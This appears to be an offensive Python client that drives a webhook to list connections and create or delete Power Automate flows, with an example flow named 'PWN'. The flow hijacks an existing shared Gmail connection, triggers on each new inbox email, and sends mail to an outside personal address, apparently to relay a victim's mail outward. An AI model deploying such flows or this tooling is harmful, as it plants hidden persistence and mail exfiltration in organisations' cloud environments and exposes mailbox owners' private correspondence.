from typing import Dict, Any, List

import requests


class FlowFactory:
    def __init__(self, webhook: str):
        self.webhook = webhook
        self.session = requests.Session()

    def __command(self, action: str, inputs: Dict[str, Any]):
        resp = self.session.post(url=self.webhook, json={"action": action, "inputs": inputs})
        if resp.status_code == 400:
            raise ValueError(f"Bad request schema. Error: {resp.content}.")
        elif resp.status_code == 500 and "action" in resp.headers:
            raise ValueError(f"Failed to perform action {resp.headers['action']}.")
        elif resp.status_code == 200:
            # success!
            pass
        else:
            raise ValueError(f"Unexpected status code {resp.status_code}. Error: {resp.content}.")

        json_content = resp.json()
        return json_content

    def get_connections(self, environment_id: str):
        # returns: connectionName=['name'], id=['properties']['apiId']
        return self.__command(action="getConnections", inputs={"environment": environment_id})

    def create_flow(self, environment_id: str, flow_display_name: str, flow_definition: Any, flow_state: str, connection_references: List[Dict[str, str]]):
        # returns: flowId=['flowId']
        return self.__command(action="createFlow", inputs={
            "environment": environment_id, "flowDisplayName": flow_display_name, "flowDefinition": flow_definition,
            "flowState": flow_state, "connectionReferences": connection_references})

    def delete_flow(self, environment_id: str, flow_id: str):
        # returns:
        return self.__command(action="deleteFlow", inputs={
            "environment": environment_id, "flowId": flow_id})


EXAMPLE = {
    "environment": "Default-32f814a9-68c8-4ca1-93aa-5594523476b3",
    "connectionName": "shared-gmail-444b9c37-a162-47e0-bbaf-7c2a-3fa7cbbd",
    "connectionApiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
    "flowDisplayName": "PWN",
    "flowDefinition": {
      "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
      "contentVersion": "1.0.0.0",
      "parameters": {
        "$connections": {
          "defaultValue": {},
          "type": "Object"
        },
        "$authentication": {
          "defaultValue": {},
          "type": "SecureObject"
        }
      },
      "triggers": {
        "When_a_new_email_arrives": {
          "recurrence": {
            "frequency": "Minute",
            "interval": 1
          },
          "metadata": {
            "operationMetadataId": "f8fda515-f436-4f4d-811d-33a37c6ea879"
          },
          "type": "OpenApiConnection",
          "inputs": {
            "host": {
              "apiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
              "connectionName": "shared_gmail",
              "operationId": "OnNewEmail"
            },
            "parameters": {
              "label": "INBOX",
              "importance": "All",
              "starred": "All",
              "fetchOnlyWithAttachments": False,
              "includeAttachments": False
            },
            "authentication": "@parameters('$authentication')"
          }
        }
      },
      "actions": {
        "Send_email_(V2)_2": {
          "runAfter": {},
          "metadata": {
            "operationMetadataId": "16392aa1-6da8-42ca-a366-18d69194da73"
          },
          "type": "OpenApiConnection",
          "inputs": {
            "host": {
              "apiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
              "connectionName": "shared_gmail",
              "operationId": "SendEmailV2"
            },
            "parameters": {
              "emailMessage/To": "imkrissmith@gmail.com"
            },
            "authentication": "@parameters('$authentication')"
          }
        }
      }
    },
    "flowState": "Started",
    "connectionReferences": [{"connectionName": "shared-gmail-444b9c37-a162-47e0-bbaf-7c2a-3fa7cbbd", "id": "/providers/Microsoft.PowerApps/apis/shared_gmail"}]
}

